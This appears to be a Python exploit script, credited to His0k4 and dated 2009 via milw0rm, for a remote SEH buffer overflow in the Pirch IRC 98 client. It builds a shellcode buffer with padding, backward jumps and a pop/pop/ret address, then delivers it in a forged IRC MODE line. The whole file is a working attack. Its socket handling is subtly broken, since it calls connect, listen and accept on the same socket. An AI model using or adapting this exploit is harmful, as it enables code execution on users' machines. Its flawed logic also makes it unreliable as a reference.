#!/usr/bin/python
#[*] Usage : python pirch.py
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     :      Pirch IRC 98 Client (response) Remote BOF Exploit (SEH)
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Ref	:   Bid 5079
#[*] Exploited by : His0k4
#[*] Greetings :    All friends (DZ)


from socket import *
import socket
import struct
from struct import pack
from payload import buf
import time
def shell_attack(target_machine, target_port):
# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
   

    payload =  b"DZ" #Trick track
    payload += buf
    payload += b"\x41"*(1035-len(buf))
    payload += b"\xE8\xF0\xFB\xFF\xFF" # back again
    payload += b"\x42"*5
    payload += b"\xEB\xF4\xFF\xFF" # back
    payload += b"\x9A\x2B\x40\x0A" # lucky x0A=>x00  ;)   univ p/p/r


    head =  b":irc.localhost 001 attacker :Welcome to the Internet Relay Chat network, attacker!pirch@0.0.0.0\r\n"
    head += b":attacker_test!pirch@0.0.0.gl08= MODE "+payload+b" :-i\r\n"


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    
    s.connect((target_machine, target_port)) 
    s.listen(1)

   
    c, addr = s.accept()
    
    c.recv(1024)
    c.send(head)

   
    c.close()
    s.close()

    # milw0rm.com [2009-07-12]